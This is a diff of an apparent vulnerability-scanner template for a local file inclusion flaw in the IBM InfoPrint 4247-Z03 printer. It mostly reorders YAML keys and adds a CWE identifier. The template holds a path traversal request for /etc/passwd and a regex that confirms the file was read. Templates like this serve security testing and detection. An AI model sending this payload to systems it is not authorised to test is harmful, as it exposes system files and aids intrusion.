@@ -1,5 +1,4 @@
 id: ibm-infoprint-lfi
-
 info:
   name: IBM InfoPrint 4247-Z03 Impact Matrix Printer - Local File Inclusion
   author: harshbothra_
@@ -10,24 +9,20 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
-    cwe-id: CWE-22
+    cwe-id: CWE-22,CWE-23
   metadata:
     max-request: 1
-  tags: matrix,printer,edb,ibm,lfi,vuln
-
+  tags: edb,ibm,lfi,matrix,printer,vuln
 http:
-  - method: GET
+  - matchers:
+      - status:
+          - 200
+        type: status
+      - part: body
+        regex:
+          - 'root:.*:0:0:'
+        type: regex
+    matchers-condition: and
+    method: GET
     path:
       - '{{BaseURL}}/./../../../../../../../../../../etc/passwd'
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-
-      - type: regex
-        regex:
-          - "root:.*:0:0:"
-        part: body
-
